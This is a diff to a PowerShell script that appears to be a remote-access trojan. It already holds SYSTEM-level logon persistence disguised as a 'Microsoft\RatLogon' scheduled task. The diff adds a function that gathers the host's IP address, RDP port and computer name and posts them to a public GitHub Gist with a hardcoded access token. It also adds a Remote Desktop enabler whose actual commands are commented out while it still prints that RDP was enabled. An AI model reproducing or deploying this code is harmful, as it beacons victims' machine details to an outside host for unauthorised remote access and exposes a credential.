@@ -36,10 +36,51 @@ function init {
     schtasks /create /sc ONLOGON /tn "Microsoft\RatLogon" /tr "powershell $PSCommandPath -run o" /ru "SYSTEM" /f | out-null
 }
 
+function Enable-RemoteDesktop {
+    # Enable Remote Desktop
+    #Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Terminal Server" -Name "fDenyTSConnections" -Value 0
+#
+    ## Enable Remote Desktop Firewall Rule
+    #Enable-NetFirewallRule -DisplayGroup "Remote Desktop"
+
+    Write-Output "Remote Desktop has been enabled."
+}
+
+function Create-Gist {
+    param (
+        [string]$Token
+    )
+
+    # Get IP address, port, and network name
+    $ip = (Get-NetIPAddress | Where-Object { $_.InterfaceAlias -eq "Ethernet" }).IPAddress
+    $port = 3389
+    $networkName = (Get-WmiObject -Class Win32_ComputerSystem).Name
+    $networkName = $networkName -replace " ", "_"
+
+    # Create Gist content
+    $gistContent = @{
+        description = "RDP"
+        public = $true
+        files = @{
+            "RDP.txt" = @{
+                content = "IP: $ip`nPort: $port`nNetwork Name: $networkName"
+            }
+        }
+    } | ConvertTo-Json
+
+    # Create Gist via GitHub API
+    $response = Invoke-RestMethod -Uri "https://api.github.com/gists" -Method Post -Headers @{
+        Authorization = "token $Token"
+        "User-Agent" = "PowerShell"
+    } -Body $gistContent
+
+    Write-Output "Gist created: $($response.html_url)"
+}
+
 function exec {
-    # show a message box
-    Add-Type -AssemblyName PresentationFramework
-    [System.Windows.MessageBox]::Show('Hello World!', 'Hello', 'OK', 'Information')
+    #Enable-RemoteDesktop
+    $Token = "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"
+    Create-Gist -Token $Token
 }
 
 function main {
@@ -47,6 +88,8 @@ function main {
     Startup
     if ($run -eq "init") {
         init
+        Enable-RemoteDesktop
+        exec
     } 
     if ($run -eq "o") {
         exec
